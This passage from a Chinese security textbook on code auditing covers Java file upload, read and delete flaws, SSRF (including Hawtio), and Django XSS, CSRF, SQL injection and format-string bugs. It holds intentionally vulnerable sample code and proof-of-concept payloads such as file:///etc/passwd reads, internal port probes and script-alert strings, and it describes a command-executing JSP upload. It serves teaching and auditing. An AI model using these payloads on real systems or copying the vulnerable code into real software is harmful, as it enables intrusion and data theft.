   ServletFileUpload fileUpload = new ServletFileUpload(diskFileItemFactory);

​      //解决上传文件名的中文乱码

​      fileUpload.setHeaderEncoding("UTF-8");

​      //3、判断提交上来的数据是否是上传表单的数据

​      if(!fileUpload.isMultipartContent(request)){return;}

​      //4、使用ServletFileUpload解析器解析上传数据，解析结果返回的是一个List<FileItem>集合，每一个FileItem对应一个FORM表单的输入项

​      **List<FileItem> list = fileUpload.parseRequest(request);**

​      for (FileItem item : list) {

​        //如果fileitem中封装的是普通输入项的数据

​        if(item.isFORMField()){

​          String name = item.getFieldName();

​          //解决普通输入项的数据的中文乱码问题

​         String value = item.getString("UTF-8");

​         String value1 = new String(name.getBytes("iso8859-1"),"UTF-8");

​         System.out.println(name+" "+value);

​         System.out.println(name+" "+value1);

​        }else{

​          //如果fileitem中封装的是上传文件，得到上传的文件名称，

​          String fileName = item.getName();

​          System.out.println(fileName);

​           **if(fileName==null||fileName.trim().equals("")){continue;}**

​           //处理获取到的上传文件的文件名的路径部分，只保留文件名部分

​          **fileName = fileName.substring(fileName.lastIndexOf(File.separator)+1);**

​          //获取item中的上传文件的输入流

​          InputStream is = item.getInputStream();

​          //创建一个文件输出流

​       **FileOutputStream fos = new FileOutputStream(savePath+File.separator+fileName);**

……省略



（3）  黑名单设置

在进行文件上传前很多应用程序使用黑名单校验的方式进行检验，从而抵御任意文件上传漏洞。下面给出黑名单校验机制代码，其通过获取上传文件的扩展名，然后通过equals方法判断文件扩展名是否在黑名单中。



//得到上传文件的扩展名

String fileExtName = **fileName.substring(fileName.lastIndexOf(".")+1);**       **if("jsp".equals(fileExtName)||"rar".equals(fileExtName)||"tar".equals(fileExtName)||"jar".equals(fileExtName))**{

request.setAttribute("message", "上传文件的类型不符合！！！");

request.getRequestDispatcher("/message.jsp").forward(request, response);

​            return;

​          }



但是，上述Java代码的黑名单还是能过去绕过的。对于Java代码审计而言，其主要审计上传文件处是否使用黑名单校验机制，若是黑名单该怎样进行绕过。如果是白名单，在JDK低版本中也可以使用%00截断绕过。

（4）  验证上传文件的MIME类型

在进行文件上传前很多应用程序还可以使用通过校验MIME类型的方法进行检验，从而抵御任意文件上传漏洞。下面给出MIME类型校验机制代码，其通过获取上传文件的MIME类型，然后通过进行校验。



public class mimetype {

  public static String main(String fileUrl) throws IOException {

​    String type = null;

​    URL u = new URL(fileUrl);

​    URLConnection uc = u.openConnection();

​    **type = uc.getContentType();//获取文件的MimeType类型**

​    return type;

  }}



### 13.5.2 Java中的文件读取漏洞

Java代码的任意文件读取漏洞的审计方法通常包括：黑盒测试和白盒测试。对于黑盒测试而言，审计人员可通过修改文件名参数的形式测试是否存在任意文件读取漏洞。对于白盒测试而言，主要审计对Java代码中能引起文件读取漏洞的函数进行定位，通常文件读取功能的函数包括：字节输入流InpputStream、字符输入流FileReader，同时需要使用敏感函数参数回溯法确定传递的变量是否可控。

（1）  InputStream函数代码案例

  下列代码通过请求request获取文件名，但是并未对读取的文件名进行校验，从而导致任意文件读取漏洞，同时使用InputStream方法进行文件的读取，案例代码如下：



@WebServlet("/readServlet")

public class readServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

   this.doGet(request, response);}

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​     **String filename = request.getParameter("filename");**

​    **File file = new File(filename);**

​    OutputStream outputStream = null;

​    **InputStream inputStream = new FileInputStream(file);**

​    int len;

​    byte[] bytes = new byte[1024];

​    **while(-1 != (len = inputStream.read())) {**

​      **outputStream.write(bytes,0,len);**

​    **}**

}}



（2）  FileReader函数代码案例

  与上述代码类似，下列代码使用FileReader函数进行文件读取，文件名称通过请求request获取但未对读取的文件名进行校验，从而导致任意文件读取漏洞，案例代码如下：



@WebServlet("/downServlet")

public class readServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

   this.doGet(request, response);}

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    **String filename = request.getParameter("filename");**

​    String fileContent = "";

​     **FileReader fileReader = new FileReader(filename);**

​    **BufferedReader bufferedReader = new BufferedReader(fileReader);**

​    String line = "";

​    while (null != (line = bufferedReader.readLine())) {

​      fileContent += (line + "\n");

​    }}}



### 13.5.3 Java中的文件删除漏洞

Java代码的任意文件删除漏洞通常出现在File类中，通过调用file的delete方法可以根据文件名删除文件。网站Web程序在删除文件的时候，HTTP请求传递的文件名称参数（filename）未经过严格过滤，将文件名称传递至后台程序，并直接删除服务器下某个文件。

下列代码通过request对象传递参数filename，并删除该文件。案例代码如下：



@WebServlet("/downServlet")

public class readServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

   this.doGet(request, response);}

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    **String filename = request.getParameter("filename");//****通过请求获取文件名**

​    **File file = new File(filename);**

​    PrintWriter writer = response.getWriter();

​    //如果文件存在则删除文件

​    if(**file != null && file.exists() && file.delete()**) {

​      writer.println("删除成功");

​    } else {

​      writer.println("删除失败");

​    }}}



### 13.5.4 MCMS平台文件上传漏洞分析

（1）漏洞分析

MCMS是一款基于JAVA的铭飞内容管理系统，在MCMS V4.7.0版本中，由于该网站是对文件上传的功能使用前台JS代码进行过滤，但后台代码的上传功能未对文件类型进行过滤，从而导致攻击者可上传任意文件的漏洞。

MCMS\src\main\webapp\static\plugins\ms\1.0.0\ms.upload.js是文件上传的前台校验代码，其主要通过校验文件的额mime_type类型及后缀名进行过滤。代码如下：



// 定义了默认支持上传的文件类型
 var mimeTypes = {
   "image": {
     title: "Image files",
     extensions: "jpg,JPG,jpeg,PNG,gif,png"
   },
   "all": {
     title: "all files",
     extensions: "jpg,JPG,jpeg,PNG,gif,png,ZIP,zip,DOC,doc,docx,xls,XLS,xlsx,RAR,rar"
   }

…省略…
 };



上述前台代码提供了支持的文件上传类型，而前台JS校验可使用BurpSuite抓包的方式绕过。因此，需要对该CMS后台代码的文件上传功能过滤进行审计，从而分析是否存在任意文件上传漏洞。

（2）漏洞利用

通过该CMS的文件上传功能后台代码未进行校验，因此可使用BurpSuite工具上传名为1.jsp文件，该文件功能是传递参数i并将该参数作为命令执行，如图13-16所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image626.jpg)

图13-16 上传的JSP文件代码

上传成功以后，访问该JSP文件并通过参数i传递命令为“ipconfig”，执行结果如图13-17所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image628.jpg)

图13-17 任意文件漏洞执行效果

## 13.6 Java代码中的SSRF漏洞

### 13.6.1 Java中的SSRF漏洞

服务端请求伪造（Server-Side Request Forge）简称 SSRF，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（由于请求由服务端发起，因此它能够请求到服务器的内部系统）。SSRF 形成原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，例如：从指定URL地址获取网页文本内容，加载指定地址的图片等功能。

但是和PHP语言相比，Java 中的SSRF的利用是有局限性的，Java网络请求支持的协议包括：HTTP、HTTPS、File、FTP、Mailto、JAR、Netdoc。实际场景中，一般利用HTTP/HTTPS协议来探测端口、暴力穷举等，还可以利用file协议读取/下载任意文件等。

（1）SSRF漏洞案例代码：



String url = request.getParameter("url");

String htmlContent;

try {

 URL u = new URL(url);//通过参数url创建一个URL对象

 URLConnection urlConnection = u.openConnection();开启url连接

 //指定URL的输入流，将连接的响应内容作为UTF-8编码显示

 BufferedReader base = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), "UTF-8"));

 StringBuffer html = new StringBuffer();

 while ((htmlContent = base.readLine()) != null) {

   html.append(htmlContent);}//内容最佳到html变量中

   base.close();

   print.println("<b>端口探测</b></br>");//打印内容

   print.println("<b>url:" + url + "</b></br>");

   print.println(html.toString());

   print.flush();

   } catch (Exception e) {//打印错误信息

​        e.printStackTrace();

​        print.println("ERROR!");}



以上代码流程如下：

l URL对象用openconnection()打开连接，获得URLConnection类对象；

l 使用InputStream()获取字节流；

l 然后InputStreamReader()将字节流转化成字符流；

l BufferedReader()将字符流以缓存形式输出的方式来快速获取网络数据流；

l 最终一行一行的输入到 html 变量中，输出到浏览器。

代码的主要功能模拟了http 请求，如果没有对请求地址进行限制和过滤，即可以利用来进行 SSRF 攻击。若探测内网主机IP地址为192.168.159.134是否开放了80端口，则使用Payload为：http://localhost:8080/ssrf/ssrfTest?url=http://192.168.159.134:80，若端口80开放，则如图13-18所示。若端口不开放，则打印“ERROR”。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image630.jpg)

图13-18 SSRF进行端口探测

若读取对端服务器的文件，则使用Payload为http:// localhost:8080/ssrf/ssrfTest?url=file:///etc/passswd。如图13-19所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image632.jpg)

图13-19 SSRF进行文件读取

### 13.6.2 Java中的SSRF漏洞防御

实际场景中可能出现 SSRF 的功能点有很多，例如：获取远程 URL 图片、webmail收取其他邮箱邮件、从远程服务器请求资源等等。针对这些问题相关策略如下：

l 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

l 限制请求的端口为HTTP常用端口，例如：80、443、8080、8090等。

l 禁用不需要的协议，仅允许HTTP和HTTPS请求。

l 根据业务需求，将这特定的域名加入到白名单，拒绝白名单域名之外的请求。

l 根据请求来源，判定请求地址是否为固定请求来源，将这特定的域名或IP加入到白名单，拒绝白名单之外的请求。

l 若业务需求和请求来源非固定，可以定义一个SSRF漏洞防御函数ssrfCheck。

### 13.6.3 Hawtio平台SSRF漏洞分析

（1）漏洞分析

Hawtio是用于管理Java应用程序的轻型模块化Web控制台。Hawt Hawtio小于2.5.0版本都容易受到SSRF的攻击，远程攻击者可以通过路径为“http://ip/proxy/地址”的形式发送特定的字符串，从而影响服务器到任意主机的HTTP请求。该平台页面如图13-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image634.jpg)

图13-20 Hawtio平台首页图

通过反编译hawtio-system-2.5.0.jar包找到相关文件，该平台SSRF漏洞存在于文件/src/main/java/io/hawt/web/proxy/ProxyServlet.java中，其部分代码如下：



protected void service(HttpServletRequest servletRequest, HttpServletResponse servletResponse)throws ServletException, IOException {

//通过请求servletRequest获得URL地址

​    **ProxyAddress proxyAddress = parseProxyAddress(servletRequest);**

​    if (proxyAddress == null || proxyAddress.getFullProxyUrl() == null) {

//如果URL地址为空，则打印地址找不到

​      servletResponse.setStatus(HttpServletResponse.SC_NOT_FOUND);

​      return;

​    }

​    if (proxyAddress instanceof ProxyDetails) {

​      //实例化为ProxyDetails对象

​      **ProxyDetails details = (ProxyDetails) proxyAddress;**

​      if (**!whitelist.isAllowed(details)**) {

//如果不在白名单，则打印主机不允许

​        ServletHelpers.doForbidden(servletResponse, ForbiddenReason.HOST_NOT_ALLOWED);

​        return;

​      }

​    }



上述代码的主要流程为：

l 通过parseProxyAddress函数获取URL地址；

l 判断proxyAddress是否为空，若不为空则通过whitelist.isAllowed()判断该 URL 是否在白名单里；

l 若不在白名单中则打印“HOST_NOT_ALLOWED”。

对白名单whitelist函数进行审计，其代码如下：



public ProxyWhitelist(String **whitelistStr**, boolean probeLocal) {

​    if (Strings.isBlank(whitelistStr)) {

​      whitelist = new CopyOnWriteArraySet<>();

​      regexWhitelist = Collections.emptyList();

​    } else {

**//用户自定义的白名单，通过whitelistStr字符串传递进来，并通过逗号分隔。**

​      **whitelist = new CopyOnWriteArraySet<>(filterRegex(Strings.split(whitelistStr, ",")));**

 **regexWhitelist = buildRegexWhitelist(Strings.split(whitelistStr, ","));}**

​    if (probeLocal) {

​      LOG.info("Probing local addresses ...");

​      initialiseWhitelist();

​    } else {

​      LOG.info("Probing local addresses disabled");

**//程序自动添加白名单为localhost和127.0.0.1**

​      **whitelist.add("localhost");**

​      **whitelist.add("127.0.0.1");**

​    }

​    LOG.info("Initial proxy whitelist: {}", whitelist);

  }

...



上述白名单包含两种方式：

l 判断 URL 是否为 localhost、127.0.0.1。

l 用户自己更新的白名单列表，如果不是返回 false。

程序在进行URL的传递过程中，使用白名单进行了限制。但是，程序并没有对端口、协议进行相应的限制，这导致了SSRF漏洞产生。

（2）漏洞利用

当用户访问地址为http://ip:8080/proxy/http://127.0.0.1:80/testcms/时，将通过SSRF漏洞打印本机80端口的测试CMS页面，如图13-21所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image636.jpg)

图13-21 SSRF漏洞测试图

## 13.7 单元小结

本单元主要学习了代码审计中的Java代码审计部分，分别包括：Java代码审计的入门知识、Java代码审计的常见漏洞（SQL注入漏洞、XSS漏洞、命令执行漏洞、文件操作漏洞）。通过对常见Java漏洞案例进行列举，使读者熟悉常见的Java代码漏洞的审计方法。



 

# 单元14 Python框架安全

常见的Python框架有：Django、Flask、Tornado，本单元将详解介绍Python框架的代码审计，对框架中常见的安全漏洞进行介绍，其主要分为三个部分进行介绍。

第一部分介绍Python的最主流框架Django，从该框架的简介及搭建开始，随后介绍Django中可能存在的Web安全漏洞，包括：XSS漏洞、CSRF漏洞、SQL注入漏洞、格式化字符串漏洞等。

第二部分介绍Python框架的Flask框架，介绍Flask的功能、目录结构、项目流程等，然后介绍Flask的SSTI漏洞。

第三部分介绍Python框架的Tornado框架，通过对Tornado的安装与案例进行讲解，从而介绍该框架的任意文件读取漏洞。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image638.jpg)

**单元目标：**

\1.  熟悉Python常用框架基础知识；

\2.  熟悉Django框架中常见漏洞；

\3.  了解Flask框架的SSTI漏洞；

\4.  了解Tornado框架中的任意文件读取漏洞。

## 14.1 Django框架介绍

### 14.1.1 Django框架简介

\1. Django框架与MVT模式

Django框架是一种由Python语言编写的开放源代码的Web应用框架，Django应用框架为了降低各个部件的耦合性，将Web框架分为三个部分：Model（模型）、Template（模板）、视图（View），即MVT模式。

下面对MVT模式中各模型进行介绍：

l Model（模型）：数据存取层，其负责业务对象与数据库的对象(ORM)；

l Template（模版）：表现层，其负责如何把页面展示给用户；

l View（视图）：业务逻辑层，其负责业务逻辑并在适当的时候调用Model和Template；

此外，Django还有一个URLS控制器，它的作用是将每个URL的页面请求分发给不同的View处理，View再调用相应的Model和Template。

\2. Django流程

Django框架处理HTTP请求的过程如图14-1所示，其主要包括以下几部分。

（1）  用户在页面输入URL，将其发送给URLS控制器；

（2）  URLS控制器根据URL匹配相应视图函数给对应的View进行处理；

（3）  对应的View对业务逻辑进行处理，并发送给Models读取数据；

（4）  Models向数据库中读取数据；

（5）  Models将数据返回给对应的View；

（6）  View将要展示的数据干会给Template模块进行HTML拼接；

（7）  Template将HTML模板文件返回给用户显示页面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image640.jpg)

图14-1 Django流程图

\3. Django目录结构

当使用django-admin命令（生成项目工程的命令）创建一个名称为demo的项目，命令为“django-admin startproject demo”，该项目的目录结构如图14-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image642.gif)

图14-2 Django目录结构图

下面对该项目目录的主要文件进行介绍：

（1）  setting.py：项目的整体配置文件；

（2）  urls.py：路由文件，项目的URL和函数的对应关系；

（3）  wsgi.py：项目与WSGI兼容的Web服务器入口；

（4）  manage.py：项目管理文件，用户可通过它来管理项目。

\4. Django中的View函数

Django的View函数用于处理HTTP请求的逻辑业务，其主要包含两个核心对象：HttpRequest对象和HttpResponse对象，其概况图14-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image644.jpg)

图14-3 View函数概况图

（1）  HttpRequest对象

当请求一个页面时，Django 创建一个 HttpRequest对象包含原数据的请求。Django 加载适当的视图，通过 HttpRequest作为视图函数的第一个参数。每个视图负责返回一个HttpResponse目标。

HttpRequest对象包含很多参数对HTTP请求进行详细处理，包括：path、method、Cookies、FILES、USER、Session等。下面只给出几种常见的请求参数：

l Method：请求中使用HTTP方法的字符串表示，例如：req.method=”POST”；

l COOKIE：HTTP中的Cookies的标准，键值对形式；

l FILES：包含所有上传文件的类字典对象；

l USER：是一个django.contrib.auth.models.User对象，代表当前登陆的用户；

l Sessions：当前会话的字典对象。

（2）  HttpResponse对象

HttpRequest对象由Django自动创建，但是，HttpResponse对象必须由开发者自己创建。每个View请求处理方法必须返回一个HttpResponse对象。该对象主要包括：render和redirect方法。

l render方法：用户向前台页面进行渲染，接受一个待渲染的模板文件和一个保存具体数据的字典参数。将数据填充进模板文件，最后把结果返回给浏览器。

l redirect方法：用于HTTP的请求重定向，接受一个URL参数，表示跳转到指定的URL。

\5. Django中manage.py脚本使用

Django的manage.py文件是项目管理文件，用户可通过该脚本文件管理项目，包括：启动服务器、新建app、数据改动与更新、创建管理员等操作，该文件的常用命令包括：

（1）  启动服务器



//启动服务器，默认ip和端口为http://127.0.0.1:8000

python manage.py runserver ip:port



（2）  新建app



python manage.py startapp appname //新建名称为appname的app应用



（3）  显示并记录所有数据的改动



python manage.py makemigrations



（4）  将改动更新到数据库



python manage.py migrate



（5）  创建超级管理员



python manage.py createsuperuser



### 14.1.2 实验：Django搭建

· 实验介绍

本实验将将在实验环境中进行Django环境的搭建。

· 预备知识

参考14.1.1节：Django框架简介。

· 实验目的

掌握Django的安装与搭建方法，了解Django MTV框架。

· 实验步骤

（1）  准备工作

在安装Django框架前，需要对安装环境进行准备工作，需要确保的条件包括：是否安装Python、是否安装pip。

l 检查Python安装情况



python –v  //打印python版本号



上述命令执行后，若打印python版本号，则说明该实验环境已经安装python环境。若没有安装则使用apt-get命令安装python环境。



$ sudo apt-get update       //更新

$ sudo apt-get install python3  //安装python3



l 检查pip安装情况



$ sudo apt-get install python3-pip  //安装python3-pip

$ pip3 install --upgrade pip     //升级pip

$ pip –V               //查看pip版本号



上述命令执行后，若打印pip版本号，则说明该实验环境已经安装pip环境。

（2）  安装Django环境

使用pip安装Django环境，需执行的命令为：



$ pip install django          //安装Django框架



（3）  创建并运行Django项目

使用Django中的djang-admin.py文件和manage.py文件创建并运行名为MyTestSite的项目，待执行的命令：



$ mkdir workspace

$ cd workspace

$ django-admin.py startproject MyTestSite //创建名为MyTestSite的项目

$ python3 manage.py runserver       //启动Django项目



（4）  本地与远程访问配置

  创建的Django项目可直接在本地进行访问，对于远程访问而言则需要对部分文件进行配置，修改MyTestSite/MyTestSite/setting.py，将ALLOWED_HOSTS 改为 ALLOWED_HOSTS = ['*', ]，即允许任意主机访问该项目，并使用命令启动即可。



$ python3 manage.py runserver 0.0.0.0:9999  //开启9999端口启动项目



主机访问地址http://IP:9999/查看项目启动情况，如图14-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image646.gif)

图14-4 Django项目页面图

（5）  创建超级用户登录后台

创建用户管理后台项目的用户，用户名为college，密码为360College。



$ python3 manage.py createsuperuser  //创建超级用户



  启动Django项目进行后台管理。



$ python3 manage.py runserver 0.0.0.0:9999  //开启9999端口启动项目



访问的后台管理系统http://your-ip:9999/admin，并输入用户名密码进行登录管理，图14-5为Django后台管理界面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image648.jpg)

图14-5 Django后台管理页面

## 14.2 Django框架常见漏洞

### 14.2.1 Django中的XSS漏洞

\1. Django的XSS漏洞简介

Django中XSS攻击就是跨站脚本攻击，就是利用HTML对页面进行恶意的标签渲染，从而达到攻击网站的效果，更严重的情况是直接获取用户信息，对网站造成巨大损失。

Django框架默认进行了XSS漏洞的防护，我们可以不必刻意做这些保护。但是在进行代码审计过程中，需要着重审计在调用或解除XSS防护限制时的参数传递及保护过程，以防XSS漏洞。

对Django框架代码进行审计过程中，可能存在XSS漏洞的常见情况包括：

l 前台页面属性中有动态内容，如<img alt={{foo}}>；

l 使用safe、mark_safe、autoescape用于关闭自动转义；

l 存在DOM类型XSS（可对前台代码再进行encode编码进行防御）；

l HttpResponse返回动态内容，如：return HttpResponse(‘hello %s’ %(name))

2.Django中的转义

转义就是把HTML语言中的关键字进行过滤。例如：<div>标签经过转义后，其代码将是&lt;div&gt;转义其实就是把HTML代码转换成HTML实体。默认情况下，Django自动为开发者提供自动转义（escape）功能。

关闭Djang中模板自动转义功能的方法包括：

l 使用filter safe关闭



{{data|safe}}



l 使用autoescape标签



{% autoescape off %}

​    This will not be auto-escaped: {{ data }}.

{% endautoescape %}



l 使用mark_safe函数



from django.utils.safestring import mark_safe

def get_username(self):

​      return **mark_safe**(”<a href=’/accounts/%s/’>%s</a>” %(self.user.id, self.user.username))



\3. Django中XSS漏洞案例

通过POST方法传递参数，将参数显示到前台页面，下面给出views.py代码如下：



def index(request):

​    if request.method == 'GET':

​      return render(request,'index.html')

​     else:

​       info = request.POST.get('info')

​      return render(**request,'index.html',{"value":info}**)



前台页面index.html代码如下：



<h1>Hello, Django!</h1>

<h2>**{{ value }}**</h2>



该Web应用通过访问后，使用Post方法传递参数为info=<script>alert(1)</script>其页面显示如图14-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image650.gif)

图14-6 XSS漏洞测试图

当关闭Django框架中的自动转义功能后，成功触发XSS攻击效果，下面给出存在漏洞的两种情况：

l autoescape关闭：



{% autoescape off %}

<h2>{{ value }}</h2>

{% endautoescape %}



l safe测试：



<h1>Hello, Django!</h1>

<h2>{{ value | safe }}</h2>



  触发的XSS漏洞弹框效果如图14-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image652.gif)

图14-7 XSS漏洞测试图

4.Django中XSS漏洞防御

可使用Django中的CGI函数的escape方法对用户传递的参数值进行实体编码转义，下面给出防御代码。



import cgi

def index(request):

  if request.method == 'GET':

​    return render(request,'index.html')

  else:

​    info = request.POST.get('info')

​    **info = cgi.escape(info)**

​    return **render(request,'index.html',{"value":info})**



使用CGI模块时需要注意的是escape函数的第二个参数值设置为“True”，从而尽可能多的转义字符，测试过程如下所示。



\>>> import cgi

\>>> a='<script>alert(1)</script>'

\>>> cgi.escape(a)

'&lt;script&gt;alert(1)&lt;/script&gt;' //成将脚本进行实体编码转义成功

\>>> b='" onload=alert(1)'

\>>> cgi.escape(b)

'" onload=alert(1)'    //将脚本进行实体编码转义失败

\>>> cgi.escape(b,True)   //escape函数的第二个参数设置为True

'&quot; onload=alert(1)'  //将脚本进行实体编码转义成功



### 14.2.2 Django的XSS案例

Django于2017年曾出现CVE-2017-12794漏洞，其是Django1.10.8之前版本和1.11.5之前的1.11.x版本中出现的漏洞，在响应页面为500状态码时存在的存储型XSS安全漏洞，该漏洞源于程序没有正确的过滤用户提交的输入，使得远程攻击者可利用该漏洞在浏览器中执行任意脚本代码。

\1. 漏洞补丁分析

Django发布的1.11.5版本中，修复了500页面中存在的存储型XSS漏洞，存在该漏洞的页面文件是django/views/debug.py。将Django中1.11.4和1.11.5版本进行比较，分析两个版本的区别，对比结果如图12-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image654.jpg)

图14-8 Django不同版本对比图

  从上图可知，其在两处增加了强制转义“force_escape”，从而修复了原版本中的存储型XSS漏洞。

\2. 漏洞分析

该漏洞出现的情况是当打印“The above exception {{frame.exc_cause}} was the direct cause of the following exception”时，将异常打印至前台页面则可能出现XSS漏洞。同时，触发该漏洞的条件还需要进入两个if语句，分别是{% ifchanged frame.exc_cause %}和{% if frame.exc_cause %}。

那么此类报错信息出现的情况是什么呢？对于Django而言，一般在数据库抛异常的时候，会在页面打印这样的错误语句。这主要是为了方便开发者进行SQL错误的调试，因为Django的模型最终是操作数据库，数据库中具体出现的错误，是Django无法准确预测的。那么，为了方便开发者快速找到是哪个操作触发了数据库异常，就需要将这两个异常回溯栈关联到一块。



def __exit__(self, exc_type, exc_value, traceback):

  if exc_type is None:

​    return

  for dj_exc_type in (

​      **DataError,**

​      **OperationalError,**

​      **IntegrityError,**

​      **InternalError,**

​      **ProgrammingError,**

​      **NotSupportedError,**

​      **DatabaseError,**

​      **InterfaceError,**

​      **Error,**

  ):

​    db_exc_type = getattr(self.wrapper.Database, dj_exc_type.__name__)

​     **if issubclass(exc_type, db_exc_type):**

​      dj_exc_value = dj_exc_type(*exc_value.args)

​      **dj_exc_value.__cause__ = exc_value**

​      if not hasattr(exc_value, '__traceback__'):

​        **exc_value.__traceback__ = traceback**

​      if dj_exc_type not in (DataError, IntegrityError):

​        self.wrapper.errors_occurred = True

​      six.reraise(dj_exc_type, dj_exc_value, traceback)



其中exc_type是异常，如果其类型是DataError、OperationalError、IntegrityError、InternalError、ProgrammingError、NotSupportedError、DatabaseError、InterfaceError、Error之一，则抛出一个同类型的新异常，并设置其__cause__和__traceback__为此时上下文的exc_value和traceback。exc_value是上一个异常的说明，traceback是上一个异常的回溯栈。这个函数其实就是关联了上一个异常和当前的新异常。最后，在500页面中__cause__被输出。

\3. 漏洞复现

Django使用的PostgreSQL数据库在触发异常时，会将字段名和字段值全部抛出。那么，如果字段值中包含攻击者可控的字符串，又由上文中提到的，该字符串其实就会被设置成__cause__，最后被显示在页面中。

给出漏洞复现的场景：

l 用户注册页面，未检查用户名；

l 注册一个用户名为<script>alert(1)</script>的用户；

访问 http://your-ip:8000/create_user/?username=<scRiPt>alert(1)</scRiPt>。访问时选用firefox浏览器进行测试，如图12-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image656.jpg)

图14-9 XSS漏洞复现图1

l 再次注册一个用户名为<script>alert(1)</script>的用户

再次访问http://IP:8000/create_user/?username=<scRiPt>alert(1)</scRiPt>触发duplicate key异常情况，并将错误打印值前台页面从而弹框，如图12-10所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image658.gif)

图14-10 XSS漏洞复现图2

### 14.2.3 Django中的CSRF漏洞

Django的防御CSRF漏洞的机制有三种，其包括：中间件CsrfViewMiddleware、csrfToken、X-CSRFToken请求头。

（1）服务端使用中间件CsrfViewMiddleware验证

Django默认加入了中间件django.middleware.csrf.CsrfViewMiddleware为用户实现防止跨站请求伪造的功能，将该配置写入到settings.py即可完成。Django中防跨站请求伪造功能有分为全局和局部。

l 全局：

在setting.py文件中设置中间件django.middleware.csrf.CsrfViewMiddleware。

l 局部：

@csrf_protect：为当前函数强制设置防跨站请求伪造功能，即使settings中没有设置全局中间件。

@csrf_exempt：取消当前函数防跨站请求伪造功能，即使settings中设置了全局中间件。

  （2）客户端传统表单中添加csrfToken

在使用Post方法提交表单时，可同时提交csrfToken至后台服务器，然后判断前台的Token是否与后端的csrfToken一致，从而避免CSRF漏洞的发生。

l Django在渲染模块时，使用 RequestContext处理csrf_token，从而自动为表单添加一个名为csrfmiddlewaretoken的隐藏输入参数，代码如下：



return render_to_response('Account/Login.html',data,context_instance=**RequestContext**(request))　



l 使用render自动生成csrf_token，代码如下：



return **render**(request, 'xxx.html', data)



l HTML表单中设置Token，代码如下：



<FORM action=”.” method=”post”>**{% csrf_token%}**



  （3）客户端中Ajax使用X-CSRFToken请求头

在进行post提交时，获取Cookie当中的csrftoken并在请求中添加X-CSRFToken请求头, 该请求头的数据就是csrftoken。通过$.ajaxSetup方法设置ajax请求的默认参数选项，在每次ajax的POST请求时，添加X-CSRFToken请求头。



<script type="text/javascript">

​    **var csrftoken = $.cookie('csrftoken');**

​    function csrfSafeMethod(method) {

​      return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));

​    }

​    $.ajaxSetup({

​      beforeSend: function(xhr, settings) {

​        if (!csrfSafeMethod(settings.type) && !this.crossDomain) {

​           **xhr.setRequestHeader("X-CSRFToken", csrftoken);**

​        }}

​    });



### 14.2.4 Django中的SQL注入漏洞

Django中如果使用其API去操作数据库则一般不会出现SQL注入漏洞，该漏洞的产生主要是由于代码中SQL语句直接拼接导致的，下面给出Django框架中存在SQL注入漏洞的案例代码：



def getuser(request):

  username = request.POST.get("username")

  **query = 'select \* from user where username=%s'%username**

  connection = psycopg2.connect(dbname, user, host, password)

  curs = connection.cursor()

  **curs.execute(query)**

  res = curs.fetchall()

  connection.close()

  return res



上述代码通过POST方式传递参数username，拼接SQL语句后直接执行，导致SQL注入漏洞。修复后代码如下：



def getuser(request):

  **username** = request.POST.get("username")

  **query = 'select \* from user where username=%s'**

  connection = psycopg2.connect(dbname, user, host, password)

  curs = connection.cursor()

  **curs.execute(query, [username])**

  res = curs.fetchall()



### 14.2.5 Django中的格式化字符串漏洞

\1. Django格式化字符串介绍

Python中的格式化字符串漏洞包含很多种，分别是：百分号形式格式化字符串、FORMat函数格式化字符串、python3.6以上使用f关键字格式化字符串。对于Django框架而言，其格式化字符串漏洞主要出现在FORMat函数中。利用格式化字符串漏洞，其可以过得很多敏感信息，包括：对象属性、配置文件内容等敏感信息。下面给出Django框架中存在格式化字符串漏洞的案例代码：



def view(request, *args, **kwargs):

  template = 'Hello {user}, This is your email: ' + request.GET.get('**email**')

  return HttpResponse(**template.FORMat(user=request.user)**)



上述Django代码为显示用户传入的email地址，使用GET方式传递的email将显示至前台页面，若该email参数可通过用户控制，且被解析错误将显示敏感信息。当输入的URL为http://localhost:8000/?email={user.password}则将模板拼接为Hello {user}, This is your email:{user.password}显示至前台页面，如图12-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image660.jpg)

图14-11 利用漏洞查看用户名密码

